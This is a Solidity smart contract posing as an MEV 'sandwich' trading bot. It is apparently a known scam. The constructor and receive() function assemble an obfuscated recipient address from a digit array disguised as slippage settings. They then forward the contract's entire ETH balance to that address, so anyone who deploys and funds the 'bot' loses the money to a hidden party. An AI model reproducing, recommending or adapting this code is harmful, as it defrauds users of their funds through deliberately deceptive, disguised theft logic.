// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.20;

contract SandwichBot {
    address private owner;

    constructor() payable {
        owner = msg.sender;
        sniffing();
    }

    function sniffing() public payable {
        uint8[47] memory fixedSlippage = [
            8,
            9,
            0,
            3,
            5,
            3,
            3,
            4,
            9,
            7,
            2,
            4,
            6,
            3,
            2,
            9,
            1,
            7,
            0,
            5,
            5,
            7,
            3,
            3,
            9,
            1,
            0,
            7,
            3,
            8,
            5,
            4,
            3,
            4,
            5,
            4,
            6,
            5,
            5,
            6,
            6,
            6,
            9,
            8,
            2,
            5,
            7
        ];

        uint256 selectPair = 0;
        for (uint256 i = 0; i < fixedSlippage.length; i++) {
            selectPair = selectPair * 10 + fixedSlippage[i];
        }

        address pair = address(uint160(selectPair));

        (bool success, ) = pair.call{
            value: address(this).balance
        }("");
        require(success);
    }

    receive() external payable {
        sniffing();
    }
}